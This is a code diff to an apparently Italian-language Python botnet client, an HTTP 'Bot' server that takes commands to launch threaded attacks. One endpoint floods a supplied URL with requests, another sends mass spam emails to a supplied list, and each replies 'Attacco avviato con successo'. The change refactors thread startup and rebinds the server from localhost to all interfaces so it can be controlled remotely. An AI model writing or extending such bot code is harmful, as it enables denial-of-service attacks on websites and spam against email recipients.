@@ -13,6 +13,8 @@ import psutil
 import requests
 
 server_address = ('10.0.2.15', 15200)
+
+
 # server_address = ('localhost', 15200)
 
 class Bot(BaseHTTPRequestHandler):
@@ -22,6 +24,15 @@ class Bot(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'application/json')
         self.end_headers()
+
+    def start_thread(self, t):
+        t.daemon = True
+        t.start()
+
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))
 
     def do_GET(self):
         if self.path == "/client-info":
@@ -38,32 +49,19 @@ class Bot(BaseHTTPRequestHandler):
             body = json.loads(self.rfile.read(content_length).decode('utf-8'))
 
             t = threading.Thread(target=request_spam, args=(body['url'], self.event))
-            t.daemon = True
-            t.start()
-
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))
-
+            self.start_thread(t)
         if self.path == "/mail-spam":
             content_length = int(self.headers['Content-Length'])
             body = json.loads(self.rfile.read(content_length).decode('utf-8'))
 
             t = threading.Thread(target=mail_spam,
                                  args=(body['emails'], body['message'], body["mail_object"], self.event))
-            t.daemon = True
-            t.start()
-
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))
+            self.start_thread(t)
 
 
 def run():
-    server = HTTPServer(('localhost', 8080), Bot)
-    # server = HTTPServer(('localhost', 80), Bot)
+    server = HTTPServer(('', 8080), Bot)
+    # server = HTTPServer(('', 80), Bot)
     server.serve_forever()
 
 
